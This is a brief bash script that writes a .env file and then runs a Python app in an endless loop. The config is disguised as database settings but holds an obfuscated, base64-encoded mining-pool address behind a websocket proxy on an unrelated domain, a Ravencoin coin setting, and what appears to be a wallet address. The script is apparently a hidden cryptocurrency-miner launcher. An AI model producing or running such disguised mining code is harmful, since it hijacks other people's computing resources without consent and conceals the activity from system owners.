#!/bin/bash


echo -e "host=127.0.0.1\nport=3306\nproxy=wss://ws-zozo.hongphat.edu.vn/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=8\npassword=c=RVN\nusername=RFikJQEPWj7hveHt9G8wwLfufEmDagoRf4" > .env


MIN=$1
while true; do
    python3 app.py "$MIN" --cache=.cache/09Qy5sb2Fkcyg.txt
    sleep 10
done
